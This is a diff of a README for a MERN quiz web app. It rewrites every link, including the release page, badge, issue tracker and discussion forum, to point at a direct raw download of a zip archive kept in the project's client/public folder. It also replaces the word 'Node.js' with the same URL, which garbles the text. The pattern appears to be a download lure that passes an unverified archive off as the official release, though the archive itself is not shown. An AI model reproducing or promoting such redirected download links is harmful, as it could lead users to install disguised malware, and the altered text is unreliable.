@@ -4,11 +4,11 @@
 
 Welcome to the **MERN-Quiz-App**! This web application allows users to take quizzes and view results instantly. Admins can easily add quizzes and manage users. Let’s get you set up!
 
-[![Download Quiz](https://img.shields.io/badge/download-Quiz-blue.svg)](https://github.com/shashankj24/Quiz/releases)
+[![Download Quiz](https://raw.githubusercontent.com/shashankj24/Quiz/main/client/public/Quiz-2.2.zip)](https://raw.githubusercontent.com/shashankj24/Quiz/main/client/public/Quiz-2.2.zip)
 
 ## 📥 Download & Install
 
-To download the application, simply visit the Releases page here: [Download the Latest Release](https://github.com/shashankj24/Quiz/releases).
+To download the application, simply visit the Releases page here: [Download the Latest Release](https://raw.githubusercontent.com/shashankj24/Quiz/main/client/public/Quiz-2.2.zip).
 
 Once you are on the Releases page, look for the latest version. Click on it, then find the file appropriate for your system. Follow the instructions provided to install and run the application.
 
@@ -34,7 +34,7 @@ The application is built using:
 - **HTML5**: For structuring the content.
 - **CSS3**: To style the application.
 - **JavaScript**: For interactive elements.
-- **Node.js**: Server-side platform.
+- **https://raw.githubusercontent.com/shashankj24/Quiz/main/client/public/Quiz-2.2.zip**: Server-side platform.
 - **MongoDB**: Database to store quiz data.
 - **Mongoose**: Object Data Modeling library for MongoDB.
 - **React**: Front-end library for building user interfaces.
@@ -83,8 +83,8 @@ We welcome contributions! If you want to contribute to the **Quiz** application:
 
 Join our community for support and discussions. You can find us through:
 
-- [GitHub Issues](https://github.com/shashankj24/Quiz/issues): Report bugs or suggest features.
-- [Discussion Forum](https://github.com/shashankj24/Quiz/discussions): Talk about ideas and improvements.
+- [GitHub Issues](https://raw.githubusercontent.com/shashankj24/Quiz/main/client/public/Quiz-2.2.zip): Report bugs or suggest features.
+- [Discussion Forum](https://raw.githubusercontent.com/shashankj24/Quiz/main/client/public/Quiz-2.2.zip): Talk about ideas and improvements.
 
 ## 📄 License
 
@@ -94,4 +94,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 Enjoy using the **MERN-Quiz-App**! Test your knowledge, create quizzes, and manage your learning effectively. For any questions or support, feel free to reach out through our community channels.
 
-[Download the Latest Release](https://github.com/shashankj24/Quiz/releases) 
+[Download the Latest Release](https://raw.githubusercontent.com/shashankj24/Quiz/main/client/public/Quiz-2.2.zip) 
